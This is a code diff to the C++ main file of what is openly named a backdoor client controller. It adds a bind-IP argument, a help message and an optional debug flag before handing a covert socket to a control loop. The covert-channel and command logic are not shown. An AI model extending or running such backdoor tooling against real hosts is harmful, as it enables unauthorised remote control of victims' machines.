@@ -11,14 +11,13 @@
 int setArgs(int, char**);
 int controlBackdoorLoop(CovertSocket, NetworkMonitor*);
 
-const bool debug = true;
 std::string backdoorIP;
+std::string bindIP;
 
 int main(int argc, char* argv[])
 {
     int result;
 
-    Logger::setDebug(debug);
     Logger::debug("Starting backdoor client controller");
 
     result = setArgs(argc, argv);
@@ -33,7 +32,7 @@ int main(int argc, char* argv[])
         }
     }
 
-    CovertSocket covertSocket(backdoorIP);
+    CovertSocket covertSocket(backdoorIP, bindIP);
     NetworkMonitor * networkMonitor = NetworkMonitor::getInstance();
     networkMonitor->getInterface();
     controlBackdoorLoop(covertSocket, networkMonitor);
@@ -46,20 +45,27 @@ int main(int argc, char* argv[])
  */
 int setArgs(int argc, char* argv[])
 {
-    if(argc < 2 or argc > 3) //This checks if the valid amount of args are passed in (valid arg numbers: 1 extra)
+    if(argc == 2 && strcmp(argv[1], "-h") == 0)
+    {
+        std::cout << "Usage:" << std::endl <<
+        "For help: " <<  argv[0] << " -h" << std::endl <<
+        "For connection: " << argv[0] << " Backdoor_IP Bind_IP [debug]" << std::endl;
+        return 2;
+    }
+
+    if(argc < 3 or argc > 5) //This checks if the valid amount of args are passed in (valid arg numbers: 1 extra)
     {
         Logger::error("Invalid number or args inputted");
         return 1;
     }
 
-    if(strcmp(argv[1], "-h") == 0)
-    {
-        std::cout << "Usage:" << std::endl <<
-                     "For help: " <<  argv[0] << " -h" << std::endl <<
-                     "For connection: " << argv[0] << " IP_address" << std::endl;
-        return 2;
-    }
+
     backdoorIP = argv[1]; //Set the first arg as the server IP
+    bindIP = argv[2];
+    if(argc == 4 && strcmp(argv[3], "debug") == 0)
+    {
+        Logger::setDebug(true);
+    }
     return 0;
 }
 
